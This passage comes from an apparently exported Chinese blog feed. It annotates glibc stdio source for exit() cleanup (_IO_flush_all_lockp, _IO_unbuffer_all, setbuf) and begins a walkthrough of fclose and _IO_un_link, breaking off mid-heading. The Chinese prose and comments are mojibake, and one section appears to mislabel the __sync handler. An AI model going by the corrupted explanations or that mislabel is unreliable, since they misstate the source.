(list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// è®°å½•å½“å‰ _IO_list_all çš„æ—¶é—´æˆ³ï¼Œä»å¤´éå†æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶æŒ‡é’ˆ</span></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ä¿å­˜å½“å‰å¤„ç†çš„æ–‡ä»¶æŒ‡é’ˆï¼Œå¦‚æœéœ€è¦åŠ é”å°±è¿›è¡ŒåŠ é”æ“ä½œ</span></span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœå½“å‰æ–‡ä»¶æŒ‡é’ˆæ˜¯å†™æ¨¡å¼å¹¶ä¸”æœ‰æ•°æ®è¦è¾“å‡ºï¼Œæˆ–è€…æ˜¯å®½å­—ç¬¦æ¨¡å¼å¹¶ä¸”æœ‰å®½å­—ç¬¦æ•°æ®è¦è¾“å‡ºï¼Œå°±è¿›è¡Œè¾“å‡ºæ“ä½œ</span></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœéœ€è¦åŠ é”å°±è¿›è¡Œè§£é”æ“ä½œï¼ŒåŒæ—¶æ¸…ç©º run_fp å˜é‡</span></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœ _IO_list_all çš„æ—¶é—´æˆ³å·²ç»æ”¹å˜ï¼Œè¯´æ˜æœ‰æ–°çš„æ–‡ä»¶æŒ‡é’ˆè¢«æ·»åŠ è¿›å»äº†ï¼Œéœ€è¦é‡æ–°ä»å¤´éå†</span></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">          fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">          last_stamp = _IO_list_all_stamp;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fp = fp-&gt;_chain; <span class="comment">// å¦åˆ™ç»§ç»­å¤„ç†ä¸‹ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœå®šä¹‰äº† _IO_MTSAFE_IO å®ï¼Œå°±è§£é” list_all_lockï¼ŒåŒæ—¶ç»“æŸæ¸…ç†åŒºåŸŸçš„æ“ä½œ</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶æŒ‡é’ˆçš„ç¼“å†²åŒºä¸­çš„æ•°æ®è¾“å‡ºï¼Œå¹¶æ¸…ç©ºç¼“å†²åŒºã€‚å‡½æ•°çš„è¿”å›å€¼ä¸º <code>0</code> æˆ– <code>EOF</code>ï¼Œè¡¨ç¤ºè¾“å‡ºæ˜¯å¦æˆåŠŸã€‚å‡½æ•°å‚æ•° <code>do_lock</code> è¡¨ç¤ºæ˜¯å¦éœ€è¦å¯¹æ–‡ä»¶æŒ‡é’ˆåŠ é”æ“ä½œã€‚å‡½æ•°ä¸»è¦é‡‡ç”¨äº†å¾ªç¯éå† _IO_list_all é“¾è¡¨çš„æ–¹å¼æ¥å¤„ç†æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶æŒ‡é’ˆã€‚å…¶ä¸­ï¼Œå¦‚æœå®šä¹‰äº† <code>_IO_MTSAFE_IO</code> å®ï¼Œåˆ™ä½¿ç”¨äº†çº¿ç¨‹å®‰å…¨çš„åŠ é”å’Œè§£é”æ“ä½œã€‚</p><p>å‡½æ•°é‡Œè°ƒç”¨_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨è™šè¡¨ä¸­çš„__overflowï¼Œå³_IO_new_file_overflowå‡½æ•°ï¼Œç¬¬ä¸€å‚æ•°_IO_FILEæ–‡ä»¶æµç»“æ„ä½“ï¼Œç¬¬äºŒä¸ªå‚æ•° EOF(-1)</p><p>fwriteåˆ†æè¿‡ï¼Œä¼šæ¥åˆ°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">     f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/02/exit/image-20230402224531539.png" alt="image-20230402224531539"></p><p><img src="/2023/04/02/exit/image-20230402224604948.png" alt="image-20230402224604948"></p><p><img src="/2023/04/02/exit/image-20230402224642501.png" alt="image-20230402224642501"></p><p>è°ƒç”¨äº†vtableä¸­__writeå¯¹åº”çš„<code>_IO_new_file_write</code></p><p>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeæŠŠæ•°æ®å†™å…¥æ–‡ä»¶</p><p><img src="/2023/04/02/exit/image-20230402230052468.png" alt="image-20230402230052468"></p><h4 id="IO-unbuffer-all"><a href="#IO-unbuffer-all" class="headerlink" title="_IO_unbuffer_all"></a>_IO_unbuffer_all</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">      &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment">         stream.  */</span></span><br><span class="line">          __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">        &#123;</span><br><span class="line">          fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">          fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">          freeres_list = fp;</span><br><span class="line">          fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">        _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">        _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment">     used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_SETBUF (fp, NULL, 0)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SETBUF(*FP*, *BUFFER*, *LENGTH*) JUMP2 (__setbuf, FP, BUFFER, LENGTH)</span></span><br></pre></td></tr></table></figure><p><strong>! (fp-&gt;_flags &amp; _IO_UNBUFFERED) &amp;&amp; fp-&gt;_mode !&#x3D; 0</strong></p><p>å¾ªç¯è°ƒç”¨æ¯ä¸ªæ–‡ä»¶æµçš„<mark>&#x3D;&#x3D;vatbleé‡Œ__setbufå¯¹åº”çš„_IO_new_file_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_setbuf _IO_file_setbuf</span></span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYNC(FP) JUMP0 (__sync, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;vtable __sync å¯¹åº”çš„_IO_default_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>å–æ¶ˆæ‰€æœ‰ç¼“å†²åŒºï¼ŒåŒ…æ‹¬æ ‡å‡†I&#x2F;Oæµå’Œç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶æµï¼Œä»¥ä¾¿æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®éƒ½ç«‹å³è¢«å†™å…¥ç£ç›˜è€Œä¸ä¼šç•™åœ¨ç¼“å†²åŒºä¸­ã€‚å®ƒéå†æ‰€æœ‰çš„_IO_FILEå¯¹è±¡ï¼Œå¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦å·²è¢«ç¼“å†²ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å–æ¶ˆç¼“å†²ï¼Œå¹¶è®¾ç½®_IO_FILEå¯¹è±¡çš„æ ‡å¿—ä»¥æŒ‡ç¤ºå®ƒä»¬å·²è¢«ç¼“å†²ã€‚å®ƒè¿˜å°†_IO_FILEå¯¹è±¡çš„æ¨¡å¼è®¾ç½®ä¸º-1ï¼Œä»¥ç¡®ä¿ä¸å†ä½¿ç”¨å®½å­—ç¬¦å‡½æ•°ã€‚åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œä»£ç ä½¿ç”¨é”æ¥ç¡®ä¿çº¿ç¨‹å®‰å…¨ã€‚</p><h2 id="å†…æ ¸å±‚é¢"><a href="#å†…æ ¸å±‚é¢" class="headerlink" title="å†…æ ¸å±‚é¢"></a>å†…æ ¸å±‚é¢</h2><h3 id="exit"><a href="#exit" class="headerlink" title="_exit()"></a>_exit()</h3><p>æœ€åè°ƒç”¨_exitç³»ç»Ÿè°ƒç”¨é”€æ¯è¿›ç¨‹</p><ol><li><code>_exit</code>ä¼šç«‹åˆ»ä¸­æ–­å½“å‰è¿›ç¨‹</li><li>å…³é—­æ‰€æœ‰å±äºè¯¥è¿›ç¨‹çš„æ–‡ä»¶</li><li>å°†è¯¥è¿›ç¨‹çš„æ‰€æœ‰å­è¿›ç¨‹ç§»äº¤ç»™<code>init</code>è¿›ç¨‹</li><li>ç»™è¯¥è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å‘é€<code>SIGCHLD</code>ä¿¡å·</li><li><code>_exit</code>çš„å‚æ•°<code>status</code>ä¼šè¢«è¿”å›ç»™çˆ¶è¿›ç¨‹ï¼Œå¯ä»¥è¢«çˆ¶è¿›ç¨‹çš„<code>wait</code>å‡½æ•°æ¥æ”¶ã€‚</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç”¨æˆ·å±‚é¢ï¼šé‡Šæ”¾TLSï¼Œéœ€è¦é‡Šæ”¾libcä¸­çš„æµç¼“å†²åŒº, é€€å‡ºå‰æ¸…ç©ºä¸‹stdoutçš„ç¼“å†²åŒº</p><p>å†…æ ¸å±‚é¢ï¼šé‡Šæ”¾æ‰è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦, é‡Šæ”¾æ‰taskç»“æ„ä½“,æœ‰èµ„æºéƒ½è¢«é‡Šæ”¾å®Œæ¯•å, å†…æ ¸ä¼šä»è°ƒåº¦é˜Ÿåˆ—ä»å–å‡ºè¿™ä¸ªä»»åŠ¡ï¼Œç„¶åå‘çˆ¶è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·, è¡¨ç¤ºæœ‰ä¸€ä¸ªå­è¿›ç¨‹ç»ˆæ­¢ï¼Œæ­¤æ—¶è¿™ä¸ªè¿›ç¨‹æ‰ç®—æ˜¯çœŸæ­£ç»“æŸ</p><p>è¿›ç¨‹ç»ˆæ­¢&#x3D;é‡Šæ”¾æ‰€æœ‰å æœ‰èµ„æº+cpuä¸åœ¨åˆ†é…æ—¶é—´ç‰‡ç»™</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fclose</title>
      <link href="/2023/04/01/IO-FILE-fclose/"/>
      <url>/2023/04/01/IO-FILE-fclose/</url>
      
        <content type="html"><![CDATA[<p>æ„Ÿè°¢raycpå¸ˆå‚…:<a href="https://xz.aliyun.com/t/5445">https://xz.aliyun.com/t/5445</a></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>] = <span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">0x20</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–­ç‚¹æ–­åˆ°æ‰§è¡Œåˆ°fcloseï¼Œç¼“å†²åŒºå·²ç»åˆå§‹åŒ–</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401212041052.png" alt="image-20230401212041052"></p><h2 id="IO-new-fclose"><a href="#IO-new-fclose" class="headerlink" title="_IO_new_fclose"></a>_IO_new_fclose</h2><p><strong>include&#x2F;stdio.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fclose(fp) _IO_new_fclose(fp)</span></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofclose.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">     the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾æ—§æ˜¯å…ˆæ£€æµ‹é­”æ•°ä½æ¥åˆ°ï¼Œæ£€æŸ¥<code>_IO_IS_FILEBUF</code>æ–‡ä»¶æŒ‡é’ˆ <code>fp</code> æ˜¯å¦ä¸æ–‡ä»¶ç¼“å†²åŒºç›¸å…³è”ï¼Œ</p><h3 id="IO-un-link-è„±é“¾"><a href="#IO-un-link-è„±é“¾" class="headerlink" title="_IO_un_link è„±é“¾"></a>_IO_un_link è„±é“¾</h3><p>_IO_un_link ((struct _IO_FILE_plus *) fp)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">    ;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">      <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">        &#123;</span><br><span class="line">          *f = fp-&gt;file._chain;</span><br><span class="line">          ++_IO_list_all_stamp;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure><p>IO_link_iné€†è¿‡ç¨‹ï¼ŒæŠŠæ–‡ä»¶æµç»“æ„ä½“ä»é“¾ä¸Šæ‹¿ä¸‹æ¥ï¼Œå…ˆæ£€æµ‹_IO_LINKED(0x80)ï¼Œçœ‹æ–‡ä»¶æµç»“æ„ä½“æ˜¯ä¸æ˜¯åœ¨IO_list_allé“¾ä¸­ï¼ŒéšåæŠŠ_IO_list_allæŒ‡å‘chainå­—æ®µä¹Ÿå°±æ˜¯ä¸‹ä¸€ä¸ª</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401221712640.png" alt="image-20230401221712640"></p><p>å†æŠŠ_IO_LINKEDæ ‡å¿—ä½ç½®ç©º</p><h3 id="IO-file-close-it-ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶ï¼Œé‡Šæ”¾ç¼“å†²åŒºï¼Œå…³é—­æ–‡ä»¶"><a href="#IO-file-close-it-ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶ï¼Œé‡Šæ”¾ç¼“å†²åŒºï¼Œå…³é—­æ–‡ä»¶" class="headerlink" title="_IO_file_close_it ç¼“å†²åŒºæ•°æ®å†™å›æ–‡ä»¶ï¼Œé‡Šæ”¾ç¼“å†²åŒºï¼Œå…³é—­æ–‡ä»¶"></a>_IO_file_close_it 